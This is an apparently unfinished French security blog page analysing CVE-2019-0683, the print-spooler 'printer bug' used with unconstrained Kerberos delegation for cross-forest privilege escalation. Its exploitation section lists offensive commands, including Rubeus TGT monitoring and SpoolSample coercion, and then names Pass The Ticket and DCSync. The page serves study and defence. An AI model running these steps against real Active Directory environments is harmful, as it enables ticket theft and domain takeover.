<!DOCTYPE html>
<html lang="en" class="js csstransforms3d">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="generator" content="Hugo 0.68.3" />
    <meta name="description" content="">
<meta name="author" content="Light">

    <link rel="icon" href="/images/favicon.png" type="image/png">

    <title>CVE-2019-0683 :: Another InfoSec Blog</title>

    
    <link href="/css/nucleus.css?1588768639" rel="stylesheet">
    <link href="/css/fontawesome-all.min.css?1588768639" rel="stylesheet">
    <link href="/css/hybrid.css?1588768639" rel="stylesheet">
    <link href="/css/featherlight.min.css?1588768639" rel="stylesheet">
    <link href="/css/perfect-scrollbar.min.css?1588768639" rel="stylesheet">
    <link href="/css/auto-complete.css?1588768639" rel="stylesheet">
    <link href="/css/atom-one-dark-reasonable.css?1588768639" rel="stylesheet">
    <link href="/css/theme.css?1588768639" rel="stylesheet">
    <link href="/css/hugo-theme.css?1588768639" rel="stylesheet">
    
      <link href="/css/theme-blue.css?1588768639" rel="stylesheet">
    

    <script src="/js/jquery-3.3.1.min.js?1588768639"></script>

    <style>
      :root #header + #content > #left > #rlblock_left{
          display:none !important;
      }
      
    </style>
    
  </head>
  <body class="" data-url="/vulnerability_corner/cve-2019-0683/">
    <nav id="sidebar" class="">



  <div id="header-wrapper">
    <div id="header">
      <a id="logo" href="http://lightsecops.github.io/">
  <svg id="logo" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
  	 viewBox="0 0 689.1 366.3" style="enable-background:new 0 0 689.1 366.3;" xml:space="preserve">
  <style type="text/css">
  	.st0{fill:#1D1D1B;}
  	.st1{fill:#FE1D39;}
  	.st2{fill:url(#SVGID_1_);}
  	.st3{fill:url(#SVGID_2_);}
  	.st4{fill:#FFFFFF;}
  	.st5{fill:url(#SVGID_3_);}
  	.st6{fill:url(#SVGID_4_);}
  	.st7{fill:none;stroke:#FFFFFF;stroke-width:6;stroke-linecap:round;stroke-linejoin:round;stroke-miterlimit:10;}
  	.st8{fill:url(#SVGID_5_);}
  	.st9{fill:#152873;}
  	.st10{fill:url(#SVGID_6_);}
  	.st11{fill:url(#SVGID_7_);}
  </style>
  <g>
  	<g>
  		<path class="st1" d="M54.6,302.1h1.2v15.5h9.6v1.1H54.6V302.1z"/>
  		<path class="st1" d="M78,302.1h1.2v16.6H78V302.1z"/>
  		<path class="st1" d="M106.4,310.5h1.2v6.2c-1.5,1.4-3.7,2.1-5.9,2.1c-5,0-8.7-3.6-8.7-8.4c0-4.8,3.7-8.4,8.7-8.4
  			c2.4,0,4.5,0.8,6,2.3l-0.8,0.8c-1.4-1.4-3.2-2-5.2-2c-4.3,0-7.5,3.1-7.5,7.3c0,4.2,3.2,7.3,7.5,7.3c1.8,0,3.4-0.4,4.7-1.5V310.5z"
  			/>
  		<path class="st1" d="M135.9,302.1v16.6h-1.2v-7.9h-11.1v7.9h-1.2v-16.6h1.2v7.7h11.1v-7.7H135.9z"/>
  		<path class="st1" d="M154.4,303.2h-6v-1.1h13.2v1.1h-6v15.5h-1.2V303.2z"/>
  		<path class="st1" d="M188,316.6l0.5-0.9c1.1,1.2,3.3,2.1,5.5,2.1c3.3,0,4.8-1.4,4.8-3.3c0-5-10.4-2-10.4-8.1
  			c0-2.4,1.8-4.4,5.9-4.4c1.8,0,3.7,0.6,5,1.5l-0.5,1c-1.4-0.9-3.1-1.4-4.6-1.4c-3.2,0-4.7,1.5-4.7,3.3c0,5,10.4,2,10.4,8.1
  			c0,2.4-1.9,4.4-6,4.4C191.6,318.8,189.2,317.9,188,316.6z"/>
  		<path class="st1" d="M225.2,317.6v1.1h-11.5v-16.6h11.1v1.1h-9.9v6.6h8.9v1.1h-8.9v6.8H225.2z"/>
  		<path class="st1" d="M237.4,310.4c0-4.8,3.7-8.4,8.6-8.4c2.4,0,4.5,0.8,5.9,2.3l-0.8,0.8c-1.4-1.4-3.2-2-5.1-2
  			c-4.3,0-7.5,3.1-7.5,7.3c0,4.2,3.2,7.3,7.5,7.3c1.9,0,3.7-0.6,5.1-2l0.8,0.8c-1.4,1.5-3.6,2.3-5.9,2.3
  			C241.1,318.8,237.4,315.2,237.4,310.4z"/>
  		<path class="st1" d="M265.3,311.7v-9.6h1.2v9.5c0,4.2,2,6.1,5.5,6.1c3.5,0,5.4-1.9,5.4-6.1v-9.5h1.2v9.6c0,4.8-2.5,7.2-6.7,7.2
  			C267.8,318.8,265.3,316.4,265.3,311.7z"/>
  		<path class="st1" d="M305.4,318.7l-4-5.6c-0.5,0.1-1,0.1-1.6,0.1H295v5.4h-1.2v-16.6h6c4.2,0,6.7,2.1,6.7,5.6
  			c0,2.6-1.4,4.5-3.9,5.2l4.2,5.8H305.4z M299.8,312.2c3.6,0,5.5-1.7,5.5-4.5c0-2.9-1.9-4.5-5.5-4.5H295v9H299.8z"/>
  		<path class="st1" d="M320.4,302.1h1.2v16.6h-1.2V302.1z"/>
  		<path class="st1" d="M340.1,303.2h-6v-1.1h13.2v1.1h-6v15.5h-1.2V303.2z"/>
  		<path class="st1" d="M364.9,313v5.7h-1.2V313l-6.7-10.9h1.3l6,9.8l6-9.8h1.3L364.9,313z"/>
  		<path class="st1" d="M398.1,310.4c0-4.8,3.7-8.4,8.6-8.4c4.9,0,8.6,3.6,8.6,8.4c0,4.8-3.7,8.4-8.6,8.4
  			C401.8,318.8,398.1,315.2,398.1,310.4z M414.2,310.4c0-4.2-3.2-7.3-7.4-7.3c-4.3,0-7.4,3.1-7.4,7.3s3.2,7.3,7.4,7.3
  			C411,317.7,414.2,314.6,414.2,310.4z"/>
  		<path class="st1" d="M441.8,307.7c0,3.5-2.5,5.6-6.7,5.6h-4.8v5.4h-1.2v-16.6h6C439.2,302.1,441.8,304.2,441.8,307.7z
  			 M440.5,307.7c0-2.9-1.9-4.5-5.5-4.5h-4.8v9h4.8C438.6,312.2,440.5,310.5,440.5,307.7z"/>
  		<path class="st1" d="M466.8,317.6v1.1h-11.5v-16.6h11.1v1.1h-9.9v6.6h8.9v1.1h-8.9v6.8H466.8z M460.9,300.7h-1.3l3.3-2.8h1.7
  			L460.9,300.7z"/>
  		<path class="st1" d="M492.3,318.7l-4-5.6c-0.5,0.1-1,0.1-1.6,0.1H482v5.4h-1.2v-16.6h6c4.2,0,6.7,2.1,6.7,5.6
  			c0,2.6-1.4,4.5-3.9,5.2l4.2,5.8H492.3z M486.7,312.2c3.6,0,5.5-1.7,5.5-4.5c0-2.9-1.9-4.5-5.5-4.5H482v9H486.7z"/>
  		<path class="st1" d="M517.6,314H508l-2.1,4.7h-1.3l7.6-16.6h1.2l7.7,16.6h-1.3L517.6,314z M517.2,313l-4.4-9.6l-4.3,9.6H517.2z"/>
  		<path class="st1" d="M536,303.2h-6v-1.1h13.2v1.1h-6v15.5H536V303.2z"/>
  		<path class="st1" d="M555.7,302.1h1.2v16.6h-1.2V302.1z"/>
  		<path class="st1" d="M570.6,310.4c0-4.8,3.7-8.4,8.6-8.4c4.9,0,8.6,3.6,8.6,8.4c0,4.8-3.7,8.4-8.6,8.4
  			C574.3,318.8,570.6,315.2,570.6,310.4z M586.6,310.4c0-4.2-3.2-7.3-7.4-7.3c-4.3,0-7.4,3.1-7.4,7.3s3.2,7.3,7.4,7.3
  			C583.4,317.7,586.6,314.6,586.6,310.4z"/>
  		<path class="st1" d="M615.1,302.1v16.6h-1l-11.3-14.4v14.4h-1.2v-16.6h1l11.3,14.4v-14.4H615.1z"/>
  		<path class="st1" d="M628.7,316.6l0.5-0.9c1.1,1.2,3.3,2.1,5.5,2.1c3.3,0,4.8-1.4,4.8-3.3c0-5-10.4-2-10.4-8.1
  			c0-2.4,1.8-4.4,5.9-4.4c1.8,0,3.7,0.6,5,1.5l-0.5,1c-1.4-0.9-3.1-1.4-4.6-1.4c-3.2,0-4.7,1.5-4.7,3.3c0,5,10.4,2,10.4,8.1
  			c0,2.4-1.9,4.4-6,4.4C632.3,318.8,629.9,317.9,628.7,316.6z"/>
  	</g>
  	<linearGradient id="SVGID_1_" gradientUnits="userSpaceOnUse" x1="53.7395" y1="254.3884" x2="639.4851" y2="254.3884">
  		<stop  offset="0" style="stop-color:#2342A5"/>
  		<stop  offset="1" style="stop-color:#152873"/>
  	</linearGradient>
  	<path class="st2" d="M75.9,269.1h11v14.8h-11c-6.1,0-11.3-2.2-15.7-6.5c-4.3-4.3-6.5-9.5-6.5-15.7v-36.9h14.7v36.9
  		c0,2,0.7,3.8,2.2,5.2C72,268.4,73.8,269.1,75.9,269.1z M100.5,283.9v-59.1h14.7v59.1H100.5z M131.9,247.1c0-6.1,2.2-11.3,6.5-15.7
  		c4.3-4.3,9.5-6.5,15.7-6.5h22.1v14.7h-22.1c-2.1,0-3.8,0.7-5.3,2.2c-1.4,1.4-2.2,3.2-2.2,5.3v14.7c0,2.1,0.7,3.8,2.2,5.3
  		c1.4,1.4,3.2,2.2,5.3,2.2c2,0,3.8-0.7,5.2-2.2c1.4-1.4,2.2-3.2,2.2-5.3h-7.3v-14.7h22.1v14.7c0,6.1-2.2,11.3-6.5,15.7
  		c-4.3,4.3-9.6,6.5-15.6,6.5c-6.1,0-11.3-2.2-15.7-6.5c-4.3-4.3-6.5-9.5-6.5-15.7V247.1z M222.4,247.1v-22.1h14.8v59h-14.8v-22.1
  		h-14.8v22.1h-14.7v-59h14.7v22.1H222.4z M251.6,239.6v-14.8h44.3v14.8h-14.8v44.3h-14.7v-44.3H251.6z M328.8,239.6
  		c-2,0-3.8,0.7-5.2,2.2c-1.4,1.4-2.2,3.2-2.2,5.2h29.5v14.8c0,6.1-2.2,11.3-6.5,15.7s-9.5,6.5-15.7,6.5h-22.1v-14.8h22.1
  		c2,0,3.8-0.7,5.2-2.2c1.4-1.4,2.2-3.2,2.2-5.2h-29.5V247c0-6.1,2.2-11.3,6.5-15.7c4.3-4.3,9.5-6.5,15.7-6.5h22.1v14.8H328.8z
  		 M387.8,224.9c6.1,0,11.3,2.2,15.7,6.5c4.3,4.3,6.5,9.6,6.5,15.6v14.8h-29.5c0,2,0.7,3.8,2.2,5.2c1.4,1.4,3.2,2.2,5.2,2.2h22.1
  		v14.8h-22.1c-6.1,0-11.3-2.2-15.7-6.5s-6.5-9.5-6.5-15.7V247c0-6.1,2.2-11.3,6.5-15.6C376.4,227,381.6,224.9,387.8,224.9z
  		 M387.8,239.6c-2,0-3.8,0.7-5.2,2.2c-1.4,1.4-2.2,3.2-2.2,5.2h14.7c0-2-0.7-3.8-2.2-5.2C391.5,240.4,389.8,239.6,387.8,239.6z
  		 M446.7,224.9c6.1,0,11.3,2.2,15.7,6.5c4.3,4.3,6.5,9.6,6.5,15.6h-14.8c0-2-0.7-3.8-2.2-5.2c-1.4-1.4-3.2-2.2-5.2-2.2
  		c-2,0-3.8,0.7-5.2,2.2c-1.4,1.4-2.2,3.2-2.2,5.2v14.8h-14.8V247c0-6.1,2.2-11.3,6.5-15.6C435.4,227,440.6,224.9,446.7,224.9z
  		 M446.7,269.1c2,0,3.8-0.7,5.2-2.2c1.4-1.4,2.2-3.2,2.2-5.2h14.8c0,6.1-2.2,11.3-6.5,15.7c-4.3,4.3-9.5,6.5-15.7,6.5
  		c-6.1,0-11.3-2.2-15.7-6.5s-6.5-9.5-6.5-15.7h14.8c0,2,0.7,3.8,2.2,5.2C443,268.4,444.7,269.1,446.7,269.1z M502.5,224.9
  		c6.1,0,11.3,2.2,15.7,6.5c4.3,4.3,6.5,9.6,6.5,15.6v14.8c0,6.1-2.2,11.3-6.5,15.7c-4.3,4.3-9.5,6.5-15.7,6.5
  		c-6.1,0-11.3-2.2-15.7-6.5c-4.3-4.3-6.5-9.5-6.5-15.7V247c0-6.1,2.2-11.3,6.5-15.6C491.2,227,496.4,224.9,502.5,224.9z
  		 M502.5,269.1c2,0,3.8-0.7,5.2-2.2c1.4-1.4,2.2-3.2,2.2-5.2V247c0-2-0.7-3.8-2.2-5.2c-1.4-1.4-3.2-2.2-5.2-2.2s-3.8,0.7-5.2,2.2
  		c-1.4,1.4-2.2,3.2-2.2,5.2v14.8c0,2,0.7,3.8,2.2,5.2C498.8,268.4,500.5,269.1,502.5,269.1z M561.7,224.9c6.1,0,11.3,2.2,15.7,6.5
  		c4.3,4.3,6.5,9.6,6.5,15.6c0,6.1-2.2,11.3-6.5,15.7c-4.3,4.3-9.5,6.5-15.7,6.5c-2.6,0-5-0.4-7.3-1.3v16.1h-14.8V247
  		c0-6.1,2.2-11.3,6.5-15.6C550.4,227,555.6,224.9,561.7,224.9z M561.7,254.4c2.1,0,3.8-0.7,5.3-2.2c1.4-1.4,2.2-3.2,2.2-5.3
  		c0-2-0.7-3.8-2.2-5.2c-1.4-1.4-3.2-2.2-5.3-2.2c-2,0-3.8,0.7-5.2,2.2c-1.4,1.4-2.2,3.2-2.2,5.2c0,2.1,0.7,3.8,2.2,5.3
  		C557.9,253.7,559.7,254.4,561.7,254.4z M617.3,239.6c-2,0-3.8,0.7-5.2,2.2c-1.4,1.4-2.2,3.2-2.2,5.2h29.5v14.8
  		c0,6.1-2.2,11.3-6.5,15.7c-4.3,4.3-9.5,6.5-15.7,6.5h-22.1v-14.8h22.1c2,0,3.8-0.7,5.2-2.2c1.4-1.4,2.2-3.2,2.2-5.2h-29.5V247
  		c0-6.1,2.2-11.3,6.5-15.7c4.3-4.3,9.5-6.5,15.7-6.5h22.1v14.8H617.3z"/>
  </g>
  <g>
  	<linearGradient id="SVGID_2_" gradientUnits="userSpaceOnUse" x1="274.0477" y1="72.602" x2="420.5742" y2="157.1992">
  		<stop  offset="0" style="stop-color:#2342A5"/>
  		<stop  offset="1" style="stop-color:#152873"/>
  	</linearGradient>
  	<path class="st3" d="M431.9,114.9c0,46.7-37.9,84.6-84.6,84.6s-84.6-37.9-84.6-84.6s37.9-84.6,84.6-84.6S431.9,68.2,431.9,114.9z"
  		/>
  	<path class="st4" d="M348.4,168.5c0,0-0.1,0-0.1,0c-54.7-1.7-63.5-63.5-63.5-64.2c-0.2-1.6,0.6-3.2,2-4l0,0
  		c0.2-0.1,16.8-9.3,31.2-26c0,0,0.1-0.1,0.1-0.1c0,0,0,0,0,0c0,0,0,0,0,0c0.1-0.1,0.3-0.3,0.4-0.4c0.6-0.5,1.4-0.8,2.3-0.9
  		c0.1,0,0.2,0,0.2,0h54.7c0.1,0,0.2,0,0.2,0c0.9,0,1.6,0.4,2.3,0.9c0,0,0,0,0,0c0.2,0.1,0.3,0.3,0.4,0.4c0,0,0.1,0.1,0.1,0.1
  		l0.4,0.5c14.3,16.4,30.6,25.4,30.8,25.5c1.4,0.8,2.3,2.4,2,4c-0.1,0.6-8.9,62.5-63.5,64.2C348.5,168.5,348.4,168.5,348.4,168.5z
  		 M324.5,80.9c0,0.1,0,0.2-0.1,0.3c-6.8,38.3,1.3,64.7,23.9,78.7c22.6-14,30.7-40.5,23.9-78.7c0-0.1,0-0.2-0.1-0.3H324.5z
  		 M293,105.9c0.9,4.7,3.6,15.4,9.6,26c7.6,13.4,17.8,22.2,30.5,26.2c-15.7-15.4-21.6-38.7-17.8-69.4C306,97.5,297.2,103.3,293,105.9
  		z M381.5,88.6c3.8,30.7-2.1,53.9-17.7,69.3c29.4-9.6,38.1-42.6,40-52.1C399.6,103.3,390.8,97.5,381.5,88.6z M288.6,103.8
  		L288.6,103.8L288.6,103.8z"/>
  	<path class="st1" d="M355.1,102.6c0,3.7-3,6.8-6.8,6.8s-6.8-3-6.8-6.8s3-6.8,6.8-6.8S355.1,98.8,355.1,102.6z M348.4,123
  		c-3.7,0-6.8,3-6.8,6.8c0,3.7,3,6.8,6.8,6.8s6.8-3,6.8-6.8C355.1,126,352.1,123,348.4,123z"/>
  </g>
  </svg>
</a>

    </div>
    
        <div class="searchbox">
    <label for="search-by"><i class="fas fa-search"></i></label>
    <input data-search-input id="search-by" type="search" placeholder="Search...">
    <span data-search-clear=""><i class="fas fa-times"></i></span>
</div>

<script type="text/javascript" src="/js/lunr.min.js?1588768639"></script>
<script type="text/javascript" src="/js/auto-complete.js?1588768639"></script>
<script type="text/javascript">
    
        var baseurl = "http:\/\/lightsecops.github.io\/";
    
</script>
<script type="text/javascript" src="/js/search.js?1588768639"></script>

    
  </div>

    <div class="highlightable">
    <ul class="topics">

        
          
          


 
  
    
    <li data-nav-id="/vulnerability_corner/" title="Analyse des Vulnerabilités" class="dd-item 
        parent
        
        
        ">
      <a href="/vulnerability_corner/">
          Analyse des Vulnerabilités
          
      </a>
      
      
        <ul>
          
          
          
          
        
          
            
            


 
  
    
      <li data-nav-id="/vulnerability_corner/cve-2019-0683/" title="CVE-2019-0683" class="dd-item active">
        <a href="/vulnerability_corner/cve-2019-0683/">
        CVE-2019-0683 aka printer bug
        
        </a>
    </li>
     
  
 

            
          
            
            


 
  
    
      <li data-nav-id="/vulnerability_corner/cve-2008-4037/" title="CVE-2008-4037 aka Faux PAC" class="dd-item ">
        <a href="/vulnerability_corner/cve-2008-4037/">
        CVE-2008-4037 aka Faux PAC
        
        </a>
    </li>
     
  
 

            
          
        
        </ul>
              
    </li>
  
 

          
          


 
  
    
    <li data-nav-id="/methodologies/" title="Méthodologies" class="dd-item 
        
        
        
        ">
      <a href="/methodologies/">
          Méthodologies
          
      </a>
      
      
        <ul>
          
          
            
          
          
          
        
          
            
            


 
  
    
    <li data-nav-id="/methodologies/execution/" title="Execution" class="dd-item 
        
        
        
        ">
      <a href="/methodologies/execution/">
          <b>2.</b>Execution
          
      </a>
      
      
        <ul>
          
          
          
          
        
          
            
            


 
  
    
      <li data-nav-id="/methodologies/execution/t1173_dynamic_data_exchange/" title="T1173 - Dynamic Data Exchange (DDE)" class="dd-item ">
        <a href="/methodologies/execution/t1173_dynamic_data_exchange/">
        T1173 - Dynamic Data Exchange (DDE)
        
        </a>
    </li>
     
  
 

            
          
            
            


 
  
    
      <li data-nav-id="/methodologies/execution/t1223_-compiled_html_file/" title="T1223 - Fichier HTML Compilé" class="dd-item ">
        <a href="/methodologies/execution/t1223_-compiled_html_file/">
        T1223 - Fichier HTML Compilé
        
        </a>
    </li>
     
  
 

            
          
        
        </ul>
              
    </li>
  
 

            
          
        
        </ul>
              
    </li>
  
 

          
         
    </ul>

    
    
      <section id="shortcuts">
        <h3>More</h3>
        <ul>
          
              <li> 
                  <a class="padding" href="https://github.com/lightsecops"><i class='fab fa-github'></i> Github </a>
              </li>
          
              <li> 
                  <a class="padding" href="https://www.linkedin.com/in/vincent-rome-382aa0109/"><i class='fab fa-linkedin'></i> Linkedin</a>
              </li>
          
              <li> 
                  <a class="padding" href="https://twitter.com/vrome_"><i class='fab fa-twitter'></i> Twitter</a>
              </li>
          
              <li> 
                  <a class="padding" href="https://www.youtube.com/channel/UCWxKcIaR0y9rlv3kvzzv5Xw"><i class='fab fa-youtube'></i> Youtube</a>
              </li>
          
        </ul>
      </section>
    

    
    <section id="footer">
      <p>Built with <a href="https://github.com/matcornic/hugo-theme-learn"><i class="fas fa-heart"></i></a> from <a href="https://getgrav.org">Grav</a> and <a href="https://gohugo.io/">Hugo</a></p>

    </section>
  </div>
</nav>





        <section id="body">
        <div id="overlay"></div>
        <div class="padding highlightable">
              
              <div>
                <div id="top-bar">
                
                
                <div id="breadcrumbs" itemscope="" itemtype="http://data-vocabulary.org/Breadcrumb">
                    <span id="sidebar-toggle-span">
                        <a href="#" id="sidebar-toggle" data-sidebar-toggle="">
                          <i class="fas fa-bars"></i>
                        </a>
                    </span>
                  
                  <span id="toc-menu"><i class="fas fa-list-alt"></i></span>
                  
                  <span class="links">
                 
                 
                    
          
          
            
            
          
          
            
            
          
          
            <a href='/'>Acceuil</a> > <a href='/vulnerability_corner/'>Analyse des Vulnerabilités</a> > CVE-2019-0683
          
         
          
         
          
        
                 
                  </span>
                </div>
                
                    <div class="progress">
    <div class="wrapper">
<nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#que-fait-rpcremotefindfirstprinterchangenotificationexhttpsdocsmicrosoftcomen-usopenspecswindows_protocolsms-rprneb66b221-1c1f-4249-b8bc-c5befec2314dredirectedfrommsdn-">Que fait <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d?redirectedfrom=MSDN">RpcRemoteFindFirstPrinterChangeNotificationEx</a> ?</a></li>
    <li><a href="#prérequis">Prérequis</a></li>
    <li><a href="#déroullement-de-lattaque">Déroullement de l&rsquo;attaque</a></li>
    <li><a href="#exploitation">Exploitation</a>
      <ul>
        <li><a href="#--rubeushttpsgithubcomghostpackrubeus--spoolsamplehttpsgithubcomleechristensenspoolsample--mimikatzhttpsgithubcomgentilkiwimimikatz">- <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> &amp; <a href="https://github.com/leechristensen/SpoolSample">SpoolSample</a> &amp; <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></a></li>
      </ul>
    </li>
    <li><a href="#références">Références</a></li>
  </ul>
</nav>
    </div>
</div>

                
              </div>
            </div>
            
        <div id="head-tags">
        
        </div>
        
        <div id="body-inner">
          
            <h1>
              
              CVE-2019-0683
            </h1>
          

        




<div class="notices info" ><blockquote>
<p><strong>Date</strong> : 26 Novembre 2018<br>
<strong>Type</strong> : Elevation de privilèges Inter-Forêt<br>
<strong>Référence</strong> : <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-0683">CVE-2019-0683</a><br>
<strong>Description</strong> : Une Vulnérabilité d'élévation de privilèges inter-forêt en raison d&rsquo;un paramètre par défaut qui permet à un attaquant dans la forêt de confiance de demander la délégation d&rsquo;un TGT pour une identité de la forêt de confiance.<br>
<strong>Score CVSS3</strong> : <code>5.3</code><br>
<strong>Accès</strong> :</p>
</blockquote>
<blockquote>
<blockquote>
<table>
<thead>
<tr>
<th>Vecteur</th>
<th>Complexité</th>
<th>Authentification</th>
</tr>
</thead>
<tbody>
<tr>
<td>RESEAU</td>
<td>MOYENNE</td>
<td>NON</td>
</tr>
<tr>
<td><strong>Impact</strong> :</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</blockquote>
</blockquote>
<blockquote>
<blockquote>
<table>
<thead>
<tr>
<th>Confidentialité</th>
<th>Intégrité</th>
<th>Disponibilité</th>
</tr>
</thead>
<tbody>
<tr>
<td>NON</td>
<td>PARTIEL</td>
<td>NON</td>
</tr>
</tbody>
</table>
</blockquote>
</blockquote>
</div>

<h2 id="introduction">Introduction</h2>
<p><strong>MS-RPRN</strong> ou  <strong>Print System Remote Protocol</strong> est le protcole utiliser par le système d&rsquo;impression à distance utilisé par Microsoft.
Ce protocole définit la communication, le traitement des tâches d&rsquo;impression, la gestion du système d&rsquo;impression entre un client d&rsquo;impression et un sereveur d&rsquo;impression.
Ce protocol est basé sur le protocol <strong>Remote Procedure Call (RPC)</strong> qui utilise des &ldquo;name pipe&rdquo;.
Le Spooler d&rsquo;impression fait référence au service logiciel qui permet d&rsquo;assurer ces divers fonctionnalités.
Windows utilise  &ldquo;Spoolsv.exe&rdquo; localisé dans  &ldquo;C:\Windows\System32&rdquo;. La communication avec ce binaire s&rsquo;effectue au travers du &ldquo;Print Spooler API&rdquo; qui peut conduire à la T-1013. Port Monitors.
La CVE-2019-0683 est vulnérabilité qui exploite le protocole MS-RPRN et le service d&rsquo;impression.
Elle permet de prendre le contrôle d’une autre forêt. Elle est <strong>patchée depuis Juillet 2019</strong> <a href="https://support.microsoft.com/en-us/help/4490425/updates-to-tgt-delegation-across-incoming-trusts-in-windows-server">Updates to TGT delegation</a>.</p>
<h2 id="que-fait-rpcremotefindfirstprinterchangenotificationexhttpsdocsmicrosoftcomen-usopenspecswindows_protocolsms-rprneb66b221-1c1f-4249-b8bc-c5befec2314dredirectedfrommsdn-">Que fait <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d?redirectedfrom=MSDN">RpcRemoteFindFirstPrinterChangeNotificationEx</a> ?</h2>
<h2 id="prérequis">Prérequis</h2>
<p>L&rsquo;attaquant a :</p>
<ul>
<li>
<ol>
<li>La mains sur <strong>Un compte utilisateur</strong> avec la &ldquo;Unconstrained Delegation&rdquo; activé. (Par défaut ceci est le cas de tous les contrôleurs de domaine)</li>
</ol>
</li>
<li>
<ol start="2">
<li>A trouvé une victime qui a le <strong>Service Spooler</strong> d&rsquo;impression en cours.(spoolsv.exe)</li>
</ol>
</li>
<li>
<ol start="3">
<li>A un accès de type <strong>Administrateur</strong> sur un système et il existe un accès réseau entre la victime et et ce système.</li>
</ol>
</li>
</ul>
<p>Résultat :</p>
<h2 id="déroullement-de-lattaque">Déroullement de l&rsquo;attaque</h2>
<ol>
<li>L&rsquo;attaquant contraint la victime à tenter de s&rsquo;authentifier auprès du système contrôlé par l&rsquo;attaquant qui possède la  &ldquo;Unrestricted Keberos Delegation - UKD&rdquo;</li>
</ol>
<h2 id="exploitation">Exploitation</h2>

<div class="notices info" ><p>$ip_serv_cible.foret2.local = L&rsquo;IP du serveur victime (cible)<br>
$ip_machine_attaquant.foret1.local =&gt; L&rsquo;IP du serveur contrôlé par l&rsquo;attaquant</p>
</div>

<blockquote>
<p>Vérifier si le service est bien démarrer sur la machine cible</p>
</blockquote>
<p>Méthode 1 :</p>
<pre><code class="language-console" data-lang="console">ls \\$ip_serv_cible\pipe\spoolss
</code></pre><p>Méthode 2 - Impacket :</p>
<pre><code class="language-console" data-lang="console">rpcdump.py -UUID &quot;12345678-1234-ABCD-EF00-0123456789AB&quot;
</code></pre><p>#use auxiliary/scanner/dcerpc/hidden
#use auxiliary/scanner/dcerpc/management
#msrpc-enum.nse</p>
<h3 id="--rubeushttpsgithubcomghostpackrubeus--spoolsamplehttpsgithubcomleechristensenspoolsample--mimikatzhttpsgithubcomgentilkiwimimikatz">- <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> &amp; <a href="https://github.com/leechristensen/SpoolSample">SpoolSample</a> &amp; <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></h3>
<blockquote>
<ol>
<li><strong>Dumper les TGT</strong> obtenu par le serveur</li>
</ol>
</blockquote>

<div class="notices tip" ><p>Laissez tourner le script</p>
</div>

<pre><code class="language-console" data-lang="console">.\Rubeus.exe monitor /interval:5
</code></pre><blockquote>
<ol start="2">
<li>Forcer le serveur cible à s&rsquo;authentifier auprès du serveur controlé</li>
</ol>
</blockquote>
<pre><code class="language-console" data-lang="console">.\SpoolSample.exe $ip_serv_cible.foret2.local $ip_machine_attaquant.foret1.local
</code></pre><blockquote>
<p>3.Pass The Ticket</p>
</blockquote>
<blockquote>
<p>4.DCSync</p>
</blockquote>
<p>Détections ?</p>
<h2 id="références">Références</h2>
<ul>
<li><a href="https://adsecurity.org/?p=4056">Domain Controller Print Server + Unconstrained Kerberos Delegation = Pwned Active Directory Forest</a></li>
<li><a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation#execution">Domain Compromise via DC Print Server and Kerberos Delegation</a></li>
<li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1">[MS-RPRN]: Print System Remote Protocol</a></li>
</ul>


<footer class="footline">
	
</footer>

        
        </div> 
        

      </div>

    <div id="navigation">
        
        
        
        
            
            
                
                    
                    
                
                

                    
                    
                        
                    
                    

                    
                        
            
            
                
                    
                    
                
                

                    
                    
                    

                    
                        
            
            
                
                    
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                        
                        
                    
                
                

                    
                    
                    

                    
            
        
                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                        
                    
                    

                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
            
        
                    
            
        
                    
            
        
        
        


	 
	 
		
			<a class="nav nav-prev" href="/vulnerability_corner/" title="Analyse des Vulnerabilités"> <i class="fa fa-chevron-left"></i></a>
		
		
			<a class="nav nav-next" href="/vulnerability_corner/cve-2008-4037/" title="CVE-2008-4037 aka Faux PAC" style="margin-right: 0px;"><i class="fa fa-chevron-right"></i></a>
		
	
    </div>

    </section>
    
    <div style="left: -1000px; overflow: scroll; position: absolute; top: -1000px; border: none; box-sizing: content-box; height: 200px; margin: 0px; padding: 0px; width: 200px;">
      <div style="border: none; box-sizing: content-box; height: 200px; margin: 0px; padding: 0px; width: 200px;"></div>
    </div>
    <script src="/js/clipboard.min.js?1588768639"></script>
    <script src="/js/perfect-scrollbar.min.js?1588768639"></script>
    <script src="/js/perfect-scrollbar.jquery.min.js?1588768639"></script>
    <script src="/js/jquery.sticky.js?1588768639"></script>
    <script src="/js/featherlight.min.js?1588768639"></script>
    <script src="/js/highlight.pack.js?1588768639"></script>
    <script>hljs.initHighlightingOnLoad();</script>
    <script src="/js/modernizr.custom-3.6.0.js?1588768639"></script>
    <script src="/js/learn.js?1588768639"></script>
    <script src="/js/hugo-learn.js?1588768639"></script>

    <link href="/mermaid/mermaid.css?1588768639" rel="stylesheet" />
    <script src="/mermaid/mermaid.js?1588768639"></script>
    <script>
        mermaid.initialize({ startOnLoad: true });
    </script>
    

  </body>
</html>

